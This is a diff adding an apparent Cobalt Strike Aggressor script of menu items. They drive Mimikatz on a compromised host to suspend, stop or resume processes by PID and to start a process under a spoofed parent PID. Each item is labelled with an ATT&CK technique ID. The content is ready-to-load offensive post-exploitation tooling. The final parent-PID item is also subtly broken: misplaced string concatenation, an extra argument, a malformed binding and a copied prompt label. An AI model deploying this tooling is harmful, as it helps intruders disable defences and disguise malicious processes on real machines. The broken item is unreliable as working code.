@@ -1,0 +1,28 @@
+#MimikKatz Process Manipulation
+	
+#Mimikatz - Suspend Process
+item "Mimikatz - Suspend Process  - T1057"{
+        prompt_text("Process to Suspend - PID:", "", lambda({
+                    bmimikatz($bids, "process::suspend /pid:" . $1);
+                }, $bids => $1));
+			}
+
+#Mimikatz - Stop Process
+       item "Mimikatz - Stop Process  - T1057"{
+        prompt_text("Process to Stop - PID:", "", lambda({
+                    bmimikatz($bids, "process::stop /pid:" . $1);
+                }, $bids => $1));
+			}
+#Mimikatz - Resume Process
+       item "MimiKatz - Resume Process  - T1057"{
+        prompt_text("Process to Resume - PID:", "", lambda({
+                    bmimikatz($bids, "process::resume /pid:" . $1);
+                }, $bids => $1));
+			}
+
+#Mimikatz - Run  Process Process			
+       item "MimiKatz - Run Process With Specified PPID  - T1057"{
+        prompt_text("Process to Suspend - PID:", "", "", lambda({
+                    bmimikatz($bids, "process::runp /run: . $1 /pid:" . $2);
+                }, $bids => $1, $2));
+			}
